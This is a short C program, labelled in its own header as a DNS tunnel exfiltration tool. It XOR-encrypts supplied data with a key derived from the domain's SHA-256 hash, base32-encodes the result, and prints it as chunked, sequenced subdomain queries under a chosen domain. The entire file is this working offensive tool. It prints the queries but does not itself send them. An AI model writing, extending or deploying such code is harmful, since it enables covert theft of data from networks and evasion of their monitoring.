/*
 * DNS tunnel exfiltration tool.
 * Encrypts data and encodes it into DNS subdomain queries.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>

static const char B32[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

static void b32enc(const unsigned char *in, size_t inlen, char *out) {
    size_t i;
    int j = 0, bits = 0;
    unsigned long buf = 0;
    for (i = 0; i < inlen; i++) {
        buf = (buf << 8) | in[i];
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            out[j++] = B32[(buf >> bits) & 0x1f];
        }
    }
    if (bits > 0)
        out[j++] = B32[(buf << (5 - bits)) & 0x1f];
    out[j] = 0;
}

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "usage: %s <domain> <data>\n", argv[0]);
        return 1;
    }

    const char *dom = argv[1];
    const char *dat = argv[2];
    size_t dlen = strlen(dat);

    /* Derive 16-byte key: SHA256(domain), take first 16 bytes */
    unsigned char hash[32];
    unsigned int hlen = 32;
    if (!EVP_Digest(dom, strlen(dom), hash, &hlen, EVP_sha256(), NULL)) {
        fprintf(stderr, "hash failed\n");
        return 1;
    }

    /* XOR encrypt payload with key */
    unsigned char *enc = (unsigned char *)malloc(dlen);
    if (!enc) return 1;
    for (size_t i = 0; i < dlen; i++)
        enc[i] = (unsigned char)dat[i] ^ hash[i % 16];

    /* Base32 encode */
    char *b32 = (char *)malloc(dlen * 2 + 8);
    if (!b32) return 1;
    b32enc(enc, dlen, b32);

    /* Split into DNS-safe chunks and emit subdomain queries */
    size_t blen = strlen(b32);
    int seq = 0;
    for (size_t i = 0; i < blen; i += 20) {
        char chunk[24];
        size_t rem = blen - i;
        size_t cl = rem < 20 ? rem : 20;
        memcpy(chunk, b32 + i, cl);
        chunk[cl] = 0;
        printf("%s.%02x.x.%s\n", chunk, seq, dom);
        seq++;
    }

    free(enc);
    free(b32);
    return 0;
}
